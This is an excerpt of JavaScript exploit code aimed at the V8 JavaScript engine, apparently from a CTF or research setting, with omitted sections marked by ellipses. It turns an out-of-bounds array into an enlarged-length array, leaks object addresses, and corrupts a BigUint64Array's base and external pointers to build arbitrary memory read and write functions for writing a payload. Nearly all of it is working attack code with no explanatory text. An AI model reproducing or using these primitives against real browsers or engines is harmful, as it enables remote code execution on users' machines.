...
// %DebugPrint(oob_arr);
// %SystemBreak();
let obj_array = {m:0xdead, n:func};
let big_uint_array = new BigUint64Array(6);
big_uint_array[0] = 0x1234n;
big_uint_array[1] = 0x5678n;
// %DebugPrint(oob_arr);
// %DebugPrint(obj_array);
// %SystemBreak();
// oob read, get the len and properties of oob_arr
var half= f2half(arr[18]);
// change the len
half[1] = 0x2020<<1;
// write back, form the oob_arr now
arr[18] = half2f(half);
print("[+] now the oob_arr's len: "+hex(oob_arr.length));

// looking for obj element offset 
var float_object_idx = 0;
for(let i=0; i<max_size; i++) {
	// print(i);
    if(f2half(oob_arr[i])[1] == 0xdead<<1) {
...
{
    obj_array.n = obj;
    let addr = f2half(oob_arr[float_object_idx])[0];
    return BigInt(addr)
}

var big_uint_array_len = f2i(oob_arr[float_array_big_len_idx]);
var big_uint_array_base_ptr = f2i(oob_arr[float_array_big_base_idx]);
var big_uint_array_external_ptr = f2i(oob_arr[float_array_big_external_idx]);
...
{
    oob_arr[float_array_big_base_idx] = i2f(addr-0x8n);
    let val = big_uint_array[0];
    oob_arr[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    return val;
...
function In_heap_write64(addr, val)
{
    ...
    oob_arr[float_array_big_external_idx] = i2f(addr-0x8n);
    big_uint_array[0] = val;
    oob_arr[float_array_big_external_idx] = i2f(big_uint_array_external_ptr);
    return;
}
...
function In_heap_write(addr, payload)
{
    ...
    oob_arr[float_array_big_len_idx] = i2f(sc.length);
    oob_arr[float_array_big_base_idx] = i2f(addr-0x8n);
    ...
    oob_arr[float_array_big_base_idx] = i2f(big_uint_array_base_ptr);
    oob_arr[float_array_big_len_idx] = big_uint_array_len;
}
...
function Arbitraty_write(addr, payload)
{
    ...
    let sc = Byte_to_big_int_array(payload);
    oob_arr[float_array_big_len_idx] = i2f(BigInt(sc.length));
    oob_arr[float_array_big_base_idx] = i2f(0n);
    oob_arr[float_array_big_external_idx] = i2f(addr);
    for(let i = 0; i<sc.length; i+=1) {
        big_uint_array[i] = sc[i];
    }

    oob_arr[float_array_big_len_idx] = big_uint_array_len;
    oob_arr[float_array_big_base_idx] = big_uint_array_base_ptr;
    oob_arr[float_array_big_external_idx] = big_uint_array_external_ptr;
}
